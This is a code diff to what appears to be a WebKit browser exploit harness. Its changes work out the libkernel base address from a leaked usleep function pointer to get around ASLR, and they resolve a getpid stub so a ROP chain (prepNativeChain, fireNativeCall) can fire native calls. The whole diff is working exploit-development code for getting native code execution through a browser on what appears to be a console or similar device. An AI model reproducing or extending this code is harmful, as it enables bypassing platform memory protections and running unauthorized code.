@@ -87,7 +87,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bb";
+const BUILD_ID = "rw-20250830bc";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -158,11 +158,27 @@ if (params.has("hookoff")) {
     } catch (_) { }
 }
 
-/** Live hex box wins over session (session may be stale after reload). */
-function lkFromUi() {
+/** Fn ptr in hex box or session — used for getpid stub fn+delta resolve. */
+function fnFromUi() {
+    const off = loadEffectiveOff();
     if (addrIn && addrIn.value) {
         const live = parseAddr(String(addrIn.value).trim().replace(/^0x/i, ""));
-        if (live) return live;
+        if (live && calcLkFromFnPtrZeroRead(live, off).length)
+            return live;
+    }
+    return loadLastFnPtr();
+}
+
+/** Lk base — from fn ptr (derived), 16KB hex box, or session. */
+function lkFromUi() {
+    const off = loadEffectiveOff();
+    if (addrIn && addrIn.value) {
+        const live = parseAddr(String(addrIn.value).trim().replace(/^0x/i, ""));
+        if (live) {
+            const hits = calcLkFromFnPtrZeroRead(live, off);
+            if (hits.length) return hits[0].lk;
+            if ((live.low & 0x3fff) === 0) return live;
+        }
     }
     const forced = loadForcedLibkernel();
     if (forced) return forced;
@@ -815,7 +831,7 @@ function ensureNativePrepForFire(p, off, nm) {
 
 /** Verified getpid stub — fn+delta when lk is page-aligned off from exports. */
 function resolveGetpidStubOff(p, lk, off) {
-    return resolveGetpidStub(p, lk, off, { maxProbes: 512 });
+    return resolveGetpidStub(p, lk, off, { fnPtr: fnFromUi(), maxProbes: 512 });
 }
 
 /** lk resolved on live primitive — no reload before native fire. */
@@ -3119,39 +3135,40 @@ function acceptLkFromHex(hexOverride) {
         return false;
     }
 
-    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "manual-base" });
-    if (asBase.ok) {
-        saveLibkernelSession(ptr, null, { forced: true });
-        if (addrIn) addrIn.value = String(ptr);
-        mark("LK-OK", String(ptr) + " lk accepted (0 reads) — Fire getpid when ready");
-        state("lk accepted", "ok");
-        renderOut();
-        try {
-            crashLog.append("ACCEPT OK okage " + hex, "LK-VERIFY");
-            crashLog.flushSync();
-        } catch (_) { }
-        return true;
-    }
-
     const rvaHits = calcLkFromFnPtrZeroRead(ptr, off);
     if (rvaHits.length) {
         const h = rvaHits[0];
         saveLastFnPtr(ptr);
         saveLibkernelSession(h.lk, null, { forced: true });
-        if (addrIn) addrIn.value = String(h.lk);
+        if (addrIn) addrIn.value = hex;
         let stubNote = "";
         if (window.p) {
             const stub = resolveGetpidStub(window.p, h.lk, off, { fnPtr: ptr, maxProbes: 256 });
             if (stub.verified)
                 stubNote = " stub=" + stub.tag;
+            else
+                stubNote = " stub=MISS (Start first?)";
         }
-        mark("LK-OK", String(h.lk) + " = fn−" + h.key
-            + "+0x" + h.rva.toString(16) + stubNote
-            + " (0 reads) — Fire getpid when ready");
+        mark("LK-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ")" + stubNote);
+        state("fn accepted — lk in session", "ok");
+        renderOut();
+        try {
+            crashLog.append("ACCEPT OK fn=" + hex + " lk=" + h.lk + stubNote, "LK-VERIFY");
+            crashLog.flushSync();
+        } catch (_) { }
+        return true;
+    }
+
+    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "manual-base" });
+    if (asBase.ok) {
+        saveLastFnPtr(null);
+        saveLibkernelSession(ptr, null, { forced: true });
+        if (addrIn) addrIn.value = String(ptr);
+        mark("LK-OK", String(ptr) + " lk base accepted (0 reads) — Fire getpid when ready");
         state("lk accepted", "ok");
         renderOut();
         try {
-            crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk + stubNote, "LK-VERIFY");
+            crashLog.append("ACCEPT OK okage " + hex, "LK-VERIFY");
             crashLog.flushSync();
         } catch (_) { }
         return true;
@@ -5393,7 +5410,12 @@ function init() {
     } else {
         if (clearStaleLkOnReload())
             mark("LK-FRESH", "cleared stale lk — ASLR rotates each reload");
-        mark("LK-HINT", "paste lk from cal (e.g. 81e9dc000) → Accept lk → Start");
+        try {
+            const savedFn = sessionStorage.getItem("wk-lastFnPtr");
+            if (savedFn && addrIn && !addrIn.value)
+                addrIn.value = savedFn.replace(/^0x/i, "");
+        } catch (_) { }
+        mark("LK-HINT", "paste usleep fn ptr (83b451ce0) or 16KB lk base → Accept lk → Start");
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
